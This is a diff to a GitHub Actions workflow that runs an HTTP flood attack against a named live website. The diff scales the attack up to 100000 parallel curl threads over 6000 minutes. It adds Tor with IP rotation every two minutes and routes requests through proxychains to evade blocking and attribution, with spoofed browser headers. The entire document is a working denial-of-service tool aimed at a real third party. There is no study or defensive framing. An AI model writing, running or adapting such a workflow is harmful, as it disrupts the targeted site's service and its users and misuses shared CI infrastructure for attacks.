@@ -1,4 +1,4 @@
-name: 💀 CURL ONLY - MAX DRAIN
+name: 💀 CURL + TOR - CHALLENGE FOCUS
 
 on:
   workflow_dispatch:
@@ -6,11 +6,11 @@ on:
       duration:
         description: 'المدة بالدقائق'
         required: true
-        default: '600'
+        default: '6000'
       threads:
         description: 'عدد الخيوط'
         required: true
-        default: '1000'
+        default: '100000'
 
 jobs:
   attack:
@@ -19,11 +19,14 @@ jobs:
     
     steps:
       - name: Install
-        run: sudo apt update && sudo apt install -y curl
-        
-      - name: 🔥 CURL ATTACK
         run: |
-          cat > curl_attack.sh << 'EOF'
+          sudo apt update
+          sudo apt install -y curl tor
+          sudo systemctl start tor
+          
+      - name: 🔥 CURL + TOR ATTACK
+        run: |
+          cat > curl_tor.sh << 'EOF'
           #!/bin/bash
           
           TARGET="https://flixtn.com"
@@ -37,7 +40,7 @@ jobs:
           FAIL=0
           
           echo "=========================================="
-          echo "💀 CURL ONLY - MAX DRAIN"
+          echo "💀 CURL + TOR - MAX DRAIN"
           echo "Target: $TARGET"
           echo "Duration: ${{ github.event.inputs.duration }} minutes"
           echo "Threads: $THREADS"
@@ -49,11 +52,24 @@ jobs:
           END=$((SECONDS + DURATION))
           LAST_TOTAL=0
           
+          # تجديد Tor كل دقيقتين
+          renew_tor() {
+            sudo systemctl reload tor
+            echo "🔄 Tor IP changed"
+          }
+          
+          # تشغيل تجديد Tor في الخلفية
+          (
+            while [ $SECONDS -lt $END ]; do
+              sleep 120
+              renew_tor
+            done
+          ) &
+          
           while [ $SECONDS -lt $END ]; do
-            # إطلاق الخيوط
             for i in $(seq 1 $THREADS); do
               (
-                STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET" \
+                STATUS=$(proxychains4 -q curl -s -o /dev/null -w "%{http_code}" "$TARGET" \
                   -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
                   -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9" \
                   -H "Accept-Language: ar,en;q=0.9" \
@@ -73,7 +89,6 @@ jobs:
             wait
             TOTAL=$((TOTAL + THREADS))
             
-            # إحصائيات كل ثانية
             RPS=$((TOTAL - LAST_TOTAL))
             LAST_TOTAL=$TOTAL
             
@@ -96,5 +111,5 @@ jobs:
           echo "=========================================="
           EOF
           
-          chmod +x curl_attack.sh
-          ./curl_attack.sh
+          chmod +x curl_tor.sh
+          ./curl_tor.sh
